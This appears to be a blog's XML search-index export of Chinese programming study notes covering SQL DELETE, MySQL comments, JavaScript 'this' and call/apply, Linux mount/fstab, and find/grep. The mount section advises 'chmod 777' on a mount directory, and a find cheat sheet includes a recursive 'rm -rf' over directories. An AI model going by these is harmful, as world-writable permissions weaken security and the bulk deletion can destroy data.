<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> tablename</span><br><span class="line">  [<span class="keyword">WHERE</span> search_condition]</span><br><span class="line"><span class="comment">-- -&gt;Example:</span></span><br><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> students</span><br><span class="line">  <span class="keyword">WHERE</span> neme = <span class="string">'doubi'</span>;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="MySQL注释"><a href="#MySQL注释" class="headerlink" title="MySQL注释"></a>MySQL注释</h2><ol>
<li><code>#...</code></li>
<li><code>-- ..</code>  有个空格</li>
<li><code>/*...*/</code></li>
</ol>
<h2 id="others"><a href="#others" class="headerlink" title="others"></a>others</h2><p>不等于 <code>&lt;&gt;</code></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Js--window VS Document]]></title>
      <url>http://csser.work/10/27/2015/js-window-document/</url>
      <content type="html"><![CDATA[<h3 id="Document-VS-Window"><a href="#Document-VS-Window" class="headerlink" title="Document VS Window"></a>Document VS Window</h3><p><img src="/imgs/jsStudy/windowVSdocument.jpg" alt="1"><br>这张图基本能说明问题了</p>
<blockquote><p>the window contains everything, so you can call window.screen and window.document to get those elements</p>
<footer><strong>Stackoverflow</strong><cite>@JKirchartz</cite></footer></blockquote>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.dir(<span class="built_in">window</span>);</span><br><span class="line"><span class="built_in">console</span>.dir(<span class="built_in">document</span>);</span><br><span class="line"><span class="built_in">console</span>.dir(screen);</span><br></pre></td></tr></table></figure>
<p>可以看一下三者的输出结构(不过有点繁琐),顺便学习了console的新用法,直接输出dom结构</p>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="www.dreamdu.com">梦之都</a><br><a href="http://stackoverflow.com/questions/9895202/what-is-the-difference-between-window-screen-and-document-in-javascript" target="_blank" rel="external">stackoverflow</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[js-Call/Apply]]></title>
      <url>http://csser.work/10/25/2015/js-Inherit/</url>
      <content type="html"><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>Call() 和 Apply() 都能使目标对象指定一个所需要的this对象</p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//---------call()---------</span></span><br><span class="line">object.call(thisArg[, arg1[, arg2[, ...]]])</span><br><span class="line">            <span class="comment">//thisArg : 指定的this对象</span></span><br><span class="line">                    <span class="comment">//arg1,arg2...为obejcet方法中所传入的参数值</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//---------apply()--------</span></span><br></pre></td></tr></table></figure>
<h3 id="实例-call为主"><a href="#实例-call为主" class="headerlink" title="实例(call为主)"></a>实例(call为主)</h3><h4 id="Note1-js"><a href="#Note1-js" class="headerlink" title="Note1.js"></a>Note1.js</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Product</span>(<span class="params">name, price</span>)</span>&#123;      <span class="comment">//Product方法</span></span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">  <span class="keyword">this</span>.price = price;</span><br><span class="line">  <span class="keyword">if</span>(price &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">throw</span> <span class="built_in">RangeError</span>(<span class="string">'Cannot create product "'</span> + name +<span class="string">'"'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Food</span>(<span class="params">name, price</span>)</span>&#123;         <span class="comment">//Food类</span></span><br><span class="line">  Product.call(<span class="keyword">this</span>, name, price);  <span class="comment">//看12th行</span></span><br><span class="line">  <span class="keyword">this</span>.category = <span class="string">'food'</span>;</span><br><span class="line">&#125;</span><br><span class="line">Food.prototype = <span class="keyword">new</span> Product();     <span class="comment">//Food现在拥有了Product()的方法了</span></span><br><span class="line"><span class="keyword">var</span> cheese = <span class="keyword">new</span> Food(<span class="string">'feta'</span>, <span class="number">5</span>);   <span class="comment">//cheese现在是Food()的一个实例对象,在Food()函数中所指向的this就是cheese,而里面的call()函数中的name和price就被指定为'fete'和5了</span></span><br><span class="line"><span class="built_in">console</span>.log(cheese.category);<span class="comment">//food</span></span><br><span class="line"><span class="built_in">console</span>.log(cheese.name + <span class="string">' 价值: $'</span> + cheese.price);<span class="comment">//feta价值5</span></span><br></pre></td></tr></table></figure>
<p>继承图:<br>  Product   -&gt;  Food          -&gt;  ‘cheese’(实例)<br>  name          name               feta<br>  price         price              5<br>                category(new)      food</p>
<h4 id="Note2-js"><a href="#Note2-js" class="headerlink" title="Note2.js"></a>Note2.js</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> father = &#123;</span><br><span class="line">  age : <span class="number">50</span>,</span><br><span class="line">  birthday : <span class="function"><span class="keyword">function</span>(<span class="params">fPrefix, fPostfix</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> fPrefix + <span class="keyword">this</span>.age++ +fPostfix;  <span class="comment">//this-&gt;father对象</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> son =&#123;</span><br><span class="line">  age : <span class="number">22</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(father.birthday(<span class="string">'Dad is '</span>,<span class="string">' now.'</span>));</span><br><span class="line"><span class="built_in">console</span>.log(father.birthday.call(son, <span class="string">'Son is '</span>,<span class="string">' now'</span>)); <span class="comment">//this-&gt;son对象</span></span><br><span class="line"><span class="built_in">console</span>.log(father.birthday.apply(son,[<span class="string">'Son is '</span>,<span class="string">' now.'</span>]));</span><br></pre></td></tr></table></figure>
<h4 id="call-VS-apply"><a href="#call-VS-apply" class="headerlink" title="call VS apply"></a>call VS apply</h4><p>call接受args  apply接受arg+args<a href="`数组`"></a></p>
<p>apply 如果没有用数组, 会出现<code>Uncaught TypeError: CreateListFromArrayLike called on non-object</code>类似的问题</p>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function/call" target="_blank" rel="external">MDN-call()</a><br><a href="http://rusticode.com/2012/08/15/javascript-call-and-apply/" target="_blank" rel="external">rusticode.com</a><br><a href="https://msdn.microsoft.com/en-us/library/h2ak8h2y\(v=vs.94\" target="_blank" rel="external">MSDN</a>.aspx)<br><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function/apply" target="_blank" rel="external">MDN-apply()</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[分区挂载/自动加载]]></title>
      <url>http://csser.work/10/21/2015/linux-cmd-mount/</url>
      <content type="html"><![CDATA[<h3 id="分区挂载"><a href="#分区挂载" class="headerlink" title="分区挂载"></a>分区挂载</h3><h4 id="mount命令"><a href="#mount命令" class="headerlink" title="mount命令"></a>mount命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount [-t vfstype] [-o options] device dir</span><br></pre></td></tr></table></figure>
<ol>
<li>-t<br> vfstype类型选择 —-<code>可以不指定,系统自动选择</code><br>  iso9660            光盘/光盘映像<br>  vfat               fat32文件系统<br>  ntfs               ntfs文件系统</li>
<li>-o<br> option 挂载设置<br>  ro:                read only(只读)<br>  rw:                read write(读写)<br>  loop:              把文件作为硬盘分区进行挂载<br>  iocharset:         指定该文件系统所用的字符集</li>
<li>devie<br> 所要挂载的设备,可以通过<code>sudo fdisk -l</code>进行查询</li>
<li>dir<br> 所需要挂载的目录,e.g: /media/data #data为目标挂载目录 </li>
</ol>
<h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p>在一般的user用户之下mount可能会出现权限问题,<code>chmod 777 挂载目录</code>可以使一般user也可以正常使用</p>
<h3 id="开机自动挂载"><a href="#开机自动挂载" class="headerlink" title="开机自动挂载"></a>开机自动挂载</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /etc/fstab</span><br></pre></td></tr></table></figure>
<p>输入格式:<br>    <code>&lt;file system&gt;&lt;mount point&gt;&lt;type&gt;&lt;options&gt;&lt;dump&gt;&lt;pass&gt;</code><br>    挂载分区–挂载点(目录)–分区类型–挂载设置–dump备份设置–fsck磁盘检查设置</p>
<h4 id="option参数"><a href="#option参数" class="headerlink" title="option参数"></a>option参数</h4><pre><code>defaults: rw, suid, dev, exec, auto, nouser, and async.
auto:           系统自动挂载,fstab默认就是这个选项
nouser          只有root用户可以挂载
ro read         only只读权限
rw read         write读写权限
user            任何用户都可以挂载
noauto          开机不自动挂载
请注意`光驱和软驱只有在装有介质时才可以进行挂载,因此它是noauto`
</code></pre><h4 id="dump"><a href="#dump" class="headerlink" title="dump"></a>dump</h4><p>当其值设置为1时,将允许dump备份程序备份；设置为0时,忽略备份操作；</p>
<h4 id="fsck磁盘检查设置"><a href="#fsck磁盘检查设置" class="headerlink" title="fsck磁盘检查设置"></a>fsck磁盘检查设置</h4><p>其值是一个顺序.当其值为0时,永远不检查；而 / 根目录分区永远都为1.其它分区从2开始,数字越小越先检查,如果两个分区的数字相同,则同时检查</p>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p>分区自动挂载—<a href="http://www.bootf.com/582.html" target="_blank" rel="external">VPS管理百科</a><br>分区挂载—<a href="http://qspy.is-programmer.com/posts/40900.html" target="_blank" rel="external">Qspy随手记</a></p>
<h3 id="自己是这么挂载的"><a href="#自己是这么挂载的" class="headerlink" title="自己是这么挂载的"></a>自己是这么挂载的</h3><p>mount -t ntfs -o rw /dev/sdb5 /media/gust       #挂载<br>/dev/sdb5 /media/gust ntfs-3g rw,user,auto 0 0  #自动挂载</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Js--头疼的this]]></title>
      <url>http://csser.work/10/16/2015/js-this/</url>
      <content type="html"><![CDATA[<h2 id="优先参考"><a href="#优先参考" class="headerlink" title="优先参考"></a>优先参考</h2><p><a href="http://www.ibm.com/developerworks/cn/web/1207_wangqf_jsthis/" target="_blank" rel="external">IBM</a><br>推荐先看IBM的链接<br><blockquote><p>在Java等面向对象的语言中，this关键字的含义是明确且具体的，即指代当前对象。一般在编译期确定下来，或称为编译期绑定.JavaScript中，this 是动态绑定，或称为运行期绑定.</p>
<footer><strong>developerWorks中国</strong><cite>IBM</cite></footer></blockquote></p>
<p>然而javascript使用运行期绑定的this简直丧心病狂,啥对象都能变2333</p>
<h3 id="this的四种调用"><a href="#this的四种调用" class="headerlink" title="this的四种调用"></a>this的四种调用</h3><h4 id="1-作为对象方法调用"><a href="#1-作为对象方法调用" class="headerlink" title="1.作为对象方法调用"></a>1.作为对象方法调用</h4><p>Note1.js:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">var</span> point = &#123; </span><br><span class="line">    x : <span class="number">0</span>, </span><br><span class="line">    y : <span class="number">0</span>, </span><br><span class="line">    moveTo : <span class="function"><span class="keyword">function</span>(<span class="params">x, y</span>) </span>&#123; </span><br><span class="line">       <span class="built_in">console</span>.log(<span class="keyword">this</span>.x);</span><br><span class="line">       <span class="keyword">this</span>.x = <span class="keyword">this</span>.x + x; </span><br><span class="line">       <span class="keyword">this</span>.y = <span class="keyword">this</span>.y + y; </span><br><span class="line">       <span class="built_in">console</span>.log(<span class="keyword">this</span>.x);</span><br><span class="line">       &#125; </span><br><span class="line">    &#125;; </span><br><span class="line">    point.moveTo(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">//输出结果: 0   1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//moveTo()函数隶属于point对象,this即归为point对象</span></span><br></pre></td></tr></table></figure></p>
<h4 id="2-作为函数调用"><a href="#2-作为函数调用" class="headerlink" title="2.作为函数调用"></a>2.作为函数调用</h4><p>Note2.js<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">noSense</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.x = x;</span><br><span class="line">    &#125;</span><br><span class="line">    noSense(<span class="number">5</span>);</span><br><span class="line">    alert(<span class="built_in">window</span>.x);    <span class="comment">//5</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//this跟着原型链向上递归查找,之后找到window对象,并进行绑定</span></span><br></pre></td></tr></table></figure></p>
<p>Note3.js<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">var</span> point = &#123; </span><br><span class="line"> x : <span class="number">0</span>, </span><br><span class="line"> moveTo : <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123; </span><br><span class="line">     <span class="comment">// 内部函数</span></span><br><span class="line">     <span class="keyword">var</span> moveX = <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123; </span><br><span class="line">     <span class="keyword">this</span>.x = x;<span class="comment">//this 绑定到了哪里？</span></span><br><span class="line">    &#125;; </span><br><span class="line">    moveX(x); </span><br><span class="line">    &#125; </span><br><span class="line"> &#125;; </span><br><span class="line"> point.moveTo(<span class="number">1</span>); </span><br><span class="line"> alert(point.x); <span class="comment">// 0 </span></span><br><span class="line"> <span class="built_in">console</span>.log(<span class="built_in">window</span>.x); <span class="comment">//   1 </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//虽然Note3.js在内部函数使用了this,但是this依然绑定了window对象</span></span><br></pre></td></tr></table></figure></p>
<p>这属于<code>JavaSctipt的设计缺陷</code>,导致this无法绑定外层函数对象</p>
<p>然而机智的JS玩家利用变量替换解决了这个问题,而替换this的变量一般命名为<code>that</code>,下面是修复的程序</p>
<p>Note3Fix.js<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> point = &#123;</span><br><span class="line">x : <span class="number">0</span>, </span><br><span class="line">moveTo : <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123; </span><br><span class="line">   alert(<span class="keyword">this</span>);    <span class="comment">//执行过程中,this还未绑定,alert-&gt;[object Object]</span></span><br><span class="line">   <span class="keyword">var</span> that = <span class="keyword">this</span>;    <span class="comment">//[个人理解为是一个继承,请无视!]</span></span><br><span class="line">   <span class="comment">// 内部函数</span></span><br><span class="line">   <span class="keyword">var</span> moveX = <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123; </span><br><span class="line">   that.x = x;</span><br><span class="line">   &#125;; </span><br><span class="line">   moveX(x); </span><br><span class="line">   &#125; </span><br><span class="line">&#125;; </span><br><span class="line">point.moveTo(<span class="number">1</span>); </span><br><span class="line">alert(point.x); <span class="comment">//   1</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">window</span>.x); <span class="comment">//  一个无关的value</span></span><br></pre></td></tr></table></figure></p>
<h4 id="3-作为构造函数调用"><a href="#3-作为构造函数调用" class="headerlink" title="3.作为构造函数调用"></a>3.作为构造函数调用</h4><p>Note4.js<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">var</span> Point = <span class="keyword">new</span> <span class="function"><span class="keyword">function</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.x = x;</span><br><span class="line"> &#125;(<span class="number">1</span>);</span><br><span class="line"> alert(Point.x);    <span class="comment">//1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//JavaScript使用基于原型（prototype）的继承方式.相应的,JavaScript 中的构造函数也很特殊,如果不使用 new 调用,则和普通函数一样.作为又一项约定俗成的准则，构造函数以大写字母开头，提醒调用者使用正确的方式调用.如果调用正确，this 绑定到新创建的对象上--By IBM</span></span><br></pre></td></tr></table></figure></p>
<h4 id="4-apply-call调用"><a href="#4-apply-call调用" class="headerlink" title="4.apply/call调用"></a>4.apply/call调用</h4><p>JS中万物皆对象,对象有方法,而apply和call即为<code>函数对象的方法</code>,他们允许切换函数执行的上下文环境(context)[即更换this绑定对象]</p>
<p>Note5.js<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Point</span>(<span class="params">x, y</span>)</span>&#123; </span><br><span class="line">    <span class="keyword">this</span>.x = x; </span><br><span class="line">    <span class="keyword">this</span>.y = y; </span><br><span class="line">    <span class="keyword">this</span>.moveTo = <span class="function"><span class="keyword">function</span>(<span class="params">x, y</span>)</span>&#123; </span><br><span class="line">        <span class="keyword">this</span>.x = x; </span><br><span class="line">        <span class="keyword">this</span>.y = y; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> p1 = <span class="keyword">new</span> Point(<span class="number">0</span>, <span class="number">0</span>); <span class="comment">//构造函数生成p1对象</span></span><br><span class="line"><span class="keyword">var</span> p2 = &#123;x: <span class="number">0</span>, y: <span class="number">0</span>&#125;; </span><br><span class="line">p1.moveTo(<span class="number">1</span>, <span class="number">1</span>); </span><br><span class="line">p1.moveTo.apply(p2, [<span class="number">10</span>, <span class="number">10</span>]);  <span class="comment">//apply()使p2可以完整的使用p1的方法,call同理</span></span><br></pre></td></tr></table></figure></p>
<h3 id="理解this-这个很重要"><a href="#理解this-这个很重要" class="headerlink" title="理解this,这个很重要"></a>理解this,这个很重要</h3><p><a href="http://yehudakatz.com/2011/08/11/understanding-javascript-function-invocation-and-this/" target="_blank" rel="external">Understanding JavaScript Function Invocation and “this”</a>—-Yehuda Katz表示:<br><code>作为函数调用时，this 绑定到全局对象；作为方法调用时，this 绑定到该方法所属的对象</code></p>
<h3 id="执行环境因素-ExecutionContext"><a href="#执行环境因素-ExecutionContext" class="headerlink" title="执行环境因素(ExecutionContext)"></a>执行环境因素(ExecutionContext)</h3><h4 id="Function-bind"><a href="#Function-bind" class="headerlink" title="Function.bind"></a>Function.bind</h4><p>Note_1.js<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handler</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="comment">//code</span></span><br><span class="line">&#125;</span><br><span class="line">button.onclick = myObject.handler;  <span class="comment">//wrong</span></span><br><span class="line">button.onclick = lang.hitch(myObject, myObject.handler); <span class="comment">//true</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//这个handler自己不是很清楚.原文[IBM]..不过理解什么意思,函数return之前,this已经被绑定.so...</span></span><br></pre></td></tr></table></figure></p>
<h4 id="eval方法"><a href="#eval方法" class="headerlink" title="eval方法"></a>eval方法</h4><p>eval()在执行中,()之内的this被eval完整继承</p>
<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p><a href="http://www.zhihu.com/question/19878052" target="_blank" rel="external">var foo = function(){}和function foo()的区别-知乎</a> 可以配合前面讲到的看看</p>
<p>[js在运行期进行绑定,又由于本身是解释性语言,所以使得this绑定很奇怪(个人见解,未论证,无视!)]</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Linux 查询]]></title>
      <url>http://csser.work/10/14/2015/linux-cmd-query/</url>
      <content type="html"><![CDATA[<h2 id="文件类型"><a href="#文件类型" class="headerlink" title="文件类型"></a>文件类型</h2><blockquote>
<p>file ~/.bashrc</p>
</blockquote>
<h2 id="可执行文件"><a href="#可执行文件" class="headerlink" title="可执行文件"></a>可执行文件</h2><p>-a all 找出所有的,有时候需要root权限查找例如<code>ifconfig</code></p>
<blockquote>
<p>which -a java</p>
</blockquote>
<h2 id="文件名"><a href="#文件名" class="headerlink" title="文件名"></a>文件名</h2><h3 id="1-whereis-bmsu-file-folder"><a href="#1-whereis-bmsu-file-folder" class="headerlink" title="1.whereis [-bmsu] file/folder"></a>1.whereis [-bmsu] file/folder</h3><p>—依赖数据库—<br>-b 二进制 -m manual路径下的文件(说明文件) -s 源文件<br>-u except above three</p>
<blockquote>
<p>whereis ifconfig<br>whereis -m passwd</p>
</blockquote>
<h3 id="2-locate-ir-keyword"><a href="#2-locate-ir-keyword" class="headerlink" title="2.locate [-ir] keyword"></a>2.locate [-ir] keyword</h3><p>—依赖数据库—<br>-i 忽略大小写<br>-r regexp正则</p>
<blockquote>
<p>locate -i PAssWd</p>
</blockquote>
<p>手动更新数据库–&gt;<code>updatedb</code></p>
<h3 id="3-find-Router-option-action"><a href="#3-find-Router-option-action" class="headerlink" title="3. find [Router] [option] [action]"></a>3. find [Router] [option] [action]</h3><p>—直接查找硬盘—<br>find查找`默认递归</p>
<h4 id="指定路径"><a href="#指定路径" class="headerlink" title="指定路径"></a>指定路径</h4><p>排除<code>/media</code>和<code>/lib</code>路径查询包含<code>application</code>字样的文件<br><strong>注意</strong>,()需要转义 -i忽略大小写</p>
<blockquote>
<p>sudo find /  ( -path /media -o -path /lib ) -prune -o -iname “application” -print</p>
</blockquote>
<p>Reference: <a href="http://blog.csdn.net/imfinger/article/details/6371601" target="_blank" rel="external">lionfun</a></p>
<h4 id="时间"><a href="#时间" class="headerlink" title="时间"></a>时间</h4><p>-atime -ctime -mtime<br><img src="/imgs/bash/linux-find-time.png" alt="1"><br>图示为<code>mtime</code>选项,作图过程中忍不住安利个网站- -<a href="https://www.processon.com" target="_blank" rel="external">ProcessOn</a><br>24小时之内tools文件夹更改的地方</p>
<blockquote>
<p>find / -mtime 0.</p>
</blockquote>
<h4 id="文件名-文件类型"><a href="#文件名-文件类型" class="headerlink" title="文件名/文件类型"></a>文件名/文件类型</h4><p>在当前目录进行递归查找名为’filename’的任意扩展文件</p>
<blockquote>
<p>find . -name ‘filename.*’<br>find ~ -type s<br>type缩写===&gt;<a href="http://man.linuxde.net/find" target="_blank" rel="external">linuxde</a></p>
</blockquote>
<h2 id="文件内容"><a href="#文件内容" class="headerlink" title="文件内容"></a>文件内容</h2><h3 id="grep-acinv-–color-auto-‘words’-file"><a href="#grep-acinv-–color-auto-‘words’-file" class="headerlink" title="grep [-acinv] [–color=auto] ‘words’ file"></a>grep [-acinv] [–color=auto] ‘words’ file</h3><p>常用: -r 递归 -n 行号 -v 反向 -i 无视大小写<br>栗子:</p>
<blockquote>
<p>grep “contents” . -r -n</p>
</blockquote>
<h3 id="更多grep写在了这边-gt-鸟哥读书记"><a href="#更多grep写在了这边-gt-鸟哥读书记" class="headerlink" title="更多grep写在了这边==&gt;鸟哥读书记"></a>更多grep写在了这边==&gt;<a href="http://a1exlism.github.io/#stq=grep+%E6%AD%A3%E5%88%99&amp;stp=1" target="_blank" rel="external">鸟哥读书记</a></h3><h3 id="find-grep-组合技查询"><a href="#find-grep-组合技查询" class="headerlink" title="find grep 组合技查询"></a>find grep 组合技查询</h3><p>从当前目录下找到有关’port’的ini文件</p>
<blockquote>
<p>$ find -name *.ini | xargs grep port</p>
</blockquote>
<h3 id="find-grep快速查询"><a href="#find-grep快速查询" class="headerlink" title="find,grep快速查询"></a>find,grep快速查询</h3><blockquote>
<p>From: <a href="https://www.ibm.com/developerworks/community/wikis/home?lang=en#!/wiki/Linux" target="_blank" rel="external">IBM-grep.find-usage</a><br>find和grep的使用权限是所有用户<br>find命令的作用是在目录中根据文件名搜索文件<br>find 列出当前目录及其子目录的所有文件和文件夹的完整路径。<br>find -name Help.java 在当前目录及其子目录中搜索文件名为Help.java的文件。<br>find . -name Help.java 在当前目录及其子目录中搜索文件名为Help.java的文件(同上)。<br>find / -name Help.java 在整个硬盘中搜索文件名为Help.java的文件。<br>find -perm 755 在当前目录及其子目录中查找指定权限的文件<br>find -type b 在当前目录及其子目录下查找块设备文件。<br>find -type d 在当前目录及其子目录下查文件夹。<br>find -type c 在当前目录及其子目录下查找字符设备文件。<br>find -type p 在当前目录及其子目录下查找管道文件。<br>find -type l 在当前目录及其子目录下查找符号链接文件。<br>find -type f 在当前目录及其子目录下查找普通文件。<br>find -type d -exec ls -l {} \; 查找当前目录及其子目录下的文件夹，并将查找结果以ls -l的方式展现。<br>find -type d -ok rm -rf {} \;查找当前目录及其子目录下的文件夹，并将查找结果依次执行rm -rf命令，但是在执行命令前会有确认提示。<br>grep命令的作用是在目录中根据文件内容搜索文件<br>grep Clock <em> 查找当前目录下的所有文件中包含Clock字符串的文件，不查找子目录<br>grep -r Clock </em> 查找当前目录下的所有文件中包含Clock字符串的文件，查找子目录<br>grep -nr Clock * 查找当前目录下的所有文件中包含Clock字符串的文件，查找子目录，并显示行号</p>
</blockquote>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://www.cnblogs.com/skynet/archive/2010/12/25/1916873.html" target="_blank" rel="external">吴秦(Tyler)</a><br><a href="http://www.ai7.org/wp/html/653.html" target="_blank" rel="external">男单 618</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Js学习笔记(6)]]></title>
      <url>http://csser.work/10/13/2015/js-client-6/</url>
      <content type="html"><![CDATA[<h3 id="HTML表单"><a href="#HTML表单" class="headerlink" title="HTML表单"></a>HTML表单</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//筛选特定id,特定属性的表单input元素</span></span><br><span class="line"><span class="built_in">document</span>.querySelectorAll(<span class="string">'#id input[type="putin]'</span>);</span><br></pre></td></tr></table></figure>
<h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p><input type="file">该元素的value属性为只读</p>
<h3 id="Document属性"><a href="#Document属性" class="headerlink" title="Document属性"></a>Document属性</h3><p>cookie domain location(window共用) referrer(引导) URL tutle lastModified</p>
<h4 id="判断referrer并响应"><a href="#判断referrer并响应" class="headerlink" title="判断referrer并响应"></a>判断referrer并响应</h4><h5 id="所用函数"><a href="#所用函数" class="headerlink" title="所用函数"></a>所用函数</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">stringObject.split(separator,howmany)  <span class="comment">//分隔符,返回string数组类型(无分隔符)</span></span><br><span class="line">indexOf(searchvalue,fromindex)  <span class="comment">//返回第一次见到searchvalue时候的位置</span></span><br><span class="line">stringObject.substring(start,stop)  <span class="comment">//字符串提取</span></span><br><span class="line"><span class="built_in">unescape</span>(string) <span class="comment">//stringURL解码</span></span><br></pre></td></tr></table></figure>
